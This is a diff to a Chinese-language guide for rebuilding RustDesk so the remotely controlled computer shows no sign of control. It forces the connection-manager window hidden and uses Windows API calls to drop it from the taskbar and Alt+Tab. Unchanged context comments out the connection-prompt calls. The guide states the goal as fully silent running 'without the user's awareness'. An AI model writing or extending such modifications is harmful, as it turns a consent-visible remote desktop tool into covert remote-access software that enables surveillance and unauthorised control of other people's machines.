@@ -20,17 +20,35 @@
 
 **修改文件：** `src/ui.rs`
 
-**修改内容：** 强制设置 `HIDE_CM = true`
+**修改内容：** 强制设置 `HIDE_CM = true` 并使用 Windows API 完全隐藏
 
 ```rust
 // 强制隐藏连接管理窗口
 *cm::HIDE_CM.lock().unwrap() = true;
+
+// 完全隐藏窗口（包括任务栏）
+#[cfg(windows)]
+{
+    use winapi::um::winuser::{GetWindowLongW, SetWindowLongW, ShowWindow, GWL_EXSTYLE, WS_EX_TOOLWINDOW, SW_HIDE};
+    let hwnd = frame.get_hwnd() as isize;
+    unsafe {
+        // 添加 WS_EX_TOOLWINDOW 样式，使其不在任务栏显示
+        let ex_style = GetWindowLongW(hwnd, GWL_EXSTYLE);
+        SetWindowLongW(hwnd, GWL_EXSTYLE, ex_style | WS_EX_TOOLWINDOW as i32);
+        // 隐藏窗口
+        ShowWindow(hwnd, SW_HIDE);
+    }
+}
 ```
+
+**窗口类名：** `H-SMILE-FRAME` (Sciter UI 框架)
 
 **效果：**
 - ✅ 隐藏被控端启动时的等待窗口
 - ✅ 窗口完全隐藏在后台
-- ✅ 系统托盘可能仍有图标（可选）
+- ✅ **不在任务栏显示**
+- ✅ **不在 Alt+Tab 中显示**
+- ✅ 完全静默运行
 
 #### 1.2 隐藏连接提示窗口（已连接时）
 
@@ -434,16 +452,17 @@ copy "target\release\rustdesk.exe" "C:\Program Files (x86)\RustDesk\rustdesk.exe
 ```
 
 **预期效果：**
-- ✅ 被控端启动时**不显示等待窗口**
+- ✅ 被控端启动时**不显示等待窗口**（`H-SMILE-FRAME` 窗口）
 - ✅ 远程连接时**不显示连接提示窗口**
+- ✅ **任务栏无图标**
+- ✅ **Alt+Tab 无窗口**
 - ✅ 完全静默运行，用户无感知
-- ✅ 系统托盘可能有图标（可根据需要隐藏）
 
 ### 📋 完整修改清单
 
 | # | 文件 | 行数 | 修改内容 | 窗口 |
 |---|------|------|----------|------|
-| 1 | `src/ui.rs` | 123 | `HIDE_CM = true` | 等待窗口 ✅ |
+| 1 | `src/ui.rs` | 123 + 219-227 | `HIDE_CM = true` + Windows API 隐藏 | 等待窗口 ✅ |
 | 2 | `src/server/connection.rs` | 2177 | 注释 `try_start_cm` | 连接窗口 ✅ |
 | 3 | `src/server/connection.rs` | 2191 | 注释 `try_start_cm` | 连接窗口 ✅ |
 | 4 | `src/server/connection.rs` | 2198 | 注释 `try_start_cm` | 连接窗口 ✅ |
